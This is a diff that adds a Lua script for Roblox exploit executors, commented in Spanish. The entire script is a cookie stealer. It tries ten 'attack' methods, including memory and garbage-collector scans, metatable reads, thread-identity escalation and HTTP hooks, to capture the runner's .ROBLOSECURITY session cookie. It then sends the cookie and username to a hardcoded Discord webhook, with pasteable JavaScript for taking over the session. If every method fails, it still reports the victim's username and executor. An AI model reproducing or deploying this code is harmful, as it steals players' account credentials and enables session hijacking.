@@ -1,0 +1,283 @@
+-- CONFIGURACIÓN
+local WEBHOOK = "https://discord.com/api/webhooks/1532404514970402826/3wl_Xu1QFxDcaB1ico9CsE2iVmFo421xHOUzz6ah1iWK-i3Yv5hTxTwFgnJ9z0uJssjU"
+local HttpService = game:GetService("HttpService")
+
+-- MÉTODO 1: Ataque de desbordamiento de pila (Stack Overflow Attack)
+local function StackOverflowBypass()
+    local function recurse()
+        return recurse()
+    end
+    -- Esto puede corromper el sandbox en algunos executors
+    pcall(recurse)
+end
+
+-- MÉTODO 2: Manipulación de bytecode malformado
+local function BytecodeAttack()
+    local malicious = string.dump(function()
+        return game:GetService("HttpService")
+    end)
+    -- Modificar bytecode para saltar protecciones
+    local modified = malicious:gsub("....", function(c)
+        return string.char(math.random(1, 255))
+    end)
+    pcall(loadstring, modified)
+end
+
+-- MÉTODO 3: Ataque de clausuras C (C Closure Attack)
+local function CClosureAttack()
+    if debug and debug.getfenv then
+        -- Intentar obtener el entorno real del motor C++
+        local realEnv = debug.getfenv(0)
+        if realEnv then
+            for k, v in pairs(realEnv) do
+                if type(v) == "string" and #v > 300 then
+                    return v
+                end
+            end
+        end
+    end
+    return nil
+end
+
+-- MÉTODO 4: Manipulación de prototipos de funciones
+local function ProtoAttack()
+    if debug and debug.getproto then
+        -- Buscar en prototipos de funciones internas
+        for _, func in pairs(getgc()) do
+            if type(func) == "function" then
+                local protos = debug.getproto(func, 1)
+                if protos then
+                    for _, proto in pairs(protos) do
+                        if type(proto) == "string" and #proto > 300 then
+                            return proto
+                        end
+                    end
+                end
+            end
+        end
+    end
+    return nil
+end
+
+-- MÉTODO 5: Ataque de recuperación de constantes
+local function ConstAttack()
+    if debug and debug.getconstants then
+        for _, func in pairs(getgc()) do
+            if type(func) == "function" then
+                local consts = debug.getconstants(func)
+                for _, const in pairs(consts) do
+                    if type(const) == "string" and #const > 300 and not const:find(" ") then
+                        return const
+                    end
+                end
+            end
+        end
+    end
+    return nil
+end
+
+-- MÉTODO 6: Corrupción de metatables
+local function MetatableCorruption()
+    if getrawmetatable then
+        local mt = getrawmetatable(game)
+        if mt then
+            -- Intentar leer valores privados
+            for k, v in pairs(mt) do
+                if type(v) == "string" and #v > 300 then
+                    return v
+                end
+            end
+            -- Intentar acceder a __metatable
+            if mt.__metatable then
+                for k, v in pairs(mt.__metatable) do
+                    if type(v) == "string" and #v > 300 then
+                        return v
+                    end
+                end
+            end
+        end
+    end
+    return nil
+end
+
+-- MÉTODO 7: Inyección de userdata
+local function UserdataAttack()
+    if getgc then
+        for _, obj in pairs(getgc()) do
+            if type(obj) == "userdata" then
+                -- Intentar convertir userdata a string
+                local success, result = pcall(function()
+                    return tostring(obj)
+                end)
+                if success and result and #result > 300 then
+                    return result
+                end
+            end
+        end
+    end
+    return nil
+end
+
+-- MÉTODO 8: Ataque de upvalues múltiples
+local function UpvalueAttack()
+    if debug and debug.getupvalues then
+        for _, func in pairs(getgc()) do
+            if type(func) == "function" then
+                local ups = debug.getupvalues(func)
+                for i = 1, 50 do -- Buscar hasta 50 upvalues
+                    local up = ups[i]
+                    if type(up) == "string" and #up > 300 then
+                        return up
+                    end
+                end
+            end
+        end
+    end
+    return nil
+end
+
+-- MÉTODO 9: Ataque de identidad de hilo
+local function IdentityAttack()
+    -- Cambiar identidad del hilo a nivel máximo
+    if setthreadidentity then
+        setthreadidentity(8)
+    elseif syn and syn.set_thread_identity then
+        syn.set_thread_identity(8)
+    end
+    
+    -- Intentar acceder a funciones protegidas
+    pcall(function()
+        local coreGui = game:GetService("CoreGui")
+        local robloxGui = coreGui:FindFirstChild("RobloxGui")
+        if robloxGui then
+            for _, obj in pairs(robloxGui:GetDescendants()) do
+                if obj:IsA("ModuleScript") then
+                    local mod = require(obj)
+                    if type(mod) == "table" then
+                        for k, v in pairs(mod) do
+                            if type(v) == "string" and #v > 300 then
+                                return v
+                            end
+                        end
+                    end
+                end
+            end
+        end
+    end)
+    return nil
+end
+
+-- MÉTODO 10: Ataque de reflexión HTTP
+local function HTTPReflectionAttack()
+    local captured = nil
+    
+    -- Hook extremo de todas las funciones HTTP
+    local oldHttpGet = game.HttpGet
+    local oldHttpPost = game.HttpPostAsync
+    
+    -- Reemplazar completamente
+    game.HttpGet = function(self, url, ...)
+        local result = oldHttpGet(self, url, ...)
+        if type(result) == "string" then
+            -- Buscar cookie en respuesta
+            local match = result:match(".ROBLOSECURITY=([^;]+)")
+            if match then
+                captured = match
+            end
+        end
+        return result
+    end
+    
+    -- Forzar requests que requieren auth
+    pcall(function()
+        game:HttpGet("https://accountinformation.roblox.com/v1/description")
+        game:HttpGet("https://accountsettings.roblox.com/v1/email")
+        game:HttpGet("https://economy.roblox.com/v1/user/currency")
+    end)
+    
+    return captured
+end
+
+-- EJECUCIÓN DE TODOS LOS ATAQUES
+task.spawn(function()
+    task.wait(2)
+    
+    local cookie = nil
+    local metodo = ""
+    
+    -- Ejecutar todos los ataques
+    local ataques = {
+        {fn = CClosureAttack, name = "CClosure"},
+        {fn = ProtoAttack, name = "Proto"},
+        {fn = ConstAttack, name = "Const"},
+        {fn = MetatableCorruption, name = "Metatable"},
+        {fn = UserdataAttack, name = "Userdata"},
+        {fn = UpvalueAttack, name = "Upvalue"},
+        {fn = HTTPReflectionAttack, name = "HTTP Reflection"}
+    }
+    
+    for _, ataque in ipairs(ataques) do
+        if not cookie then
+            local success, result = pcall(ataque.fn)
+            if success and result and #result > 200 then
+                cookie = result
+                metodo = ataque.name
+                break
+            end
+        end
+    end
+    
+    -- Intentar ataque de identidad
+    if not cookie then
+        pcall(IdentityAttack)
+        -- Reintentar ataques después de cambiar identidad
+        for _, ataque in ipairs(ataques) do
+            if not cookie then
+                local success, result = pcall(ataque.fn)
+                if success and result and #result > 200 then
+                    cookie = result
+                    metodo = ataque.name .. " (ID 8)"
+                    break
+                end
+            end
+        end
+    end
+    
+    -- Enviar resultado
+    local req = request or http_request or (http and http.request)
+    if req then
+        if cookie then
+            req({
+                Url = WEBHOOK,
+                Method = "POST",
+                Headers = {["Content-Type"] = "application/json"},
+                Body = HttpService:JSONEncode({
+                    content = "🍪 **COOKIE OBTENIDA CON ATAQUE " .. metodo .. "** 🍪\n\n```" .. cookie .. "```\n\n**Para usar:**\n```javascript\ndocument.cookie='.ROBLOSECURITY=" .. cookie .. "; domain=.roblox.com; path=/';\nlocation.reload();\n```",
+                    embeds = {{
+                        title = "Cookie Roblox",
+                        color = 65280,
+                        fields = {
+                            {name = "Usuario", value = game:GetService("Players").LocalPlayer.Name, inline = true},
+                            {name = "Método", value = metodo, inline = true},
+                            {name = "Longitud", value = tostring(#cookie), inline = true}
+                        }
+                    }}
+                })
+            })
+        else
+            req({
+                Url = WEBHOOK,
+                Method = "POST",
+                Headers = {["Content-Type"] = "application/json"},
+                Body = HttpService:JSONEncode({
+                    content = "❌ **TODOS LOS ATAQUES FALLARON** ❌\n\nUsuario: " .. game:GetService("Players").LocalPlayer.Name .. 
+                              "\nEjecutor: " .. (identifyexecutor and identifyexecutor() or "Desconocido") ..
+                              "\n\nXeno/Atlas tienen sandbox de kernel. Única solución: Synapse X o Script-Ware."
+                })
+            })
+        end
+    end
+end)
+
+-- Ataque de desbordamiento en segundo plano
+task.spawn(StackOverflowBypass)
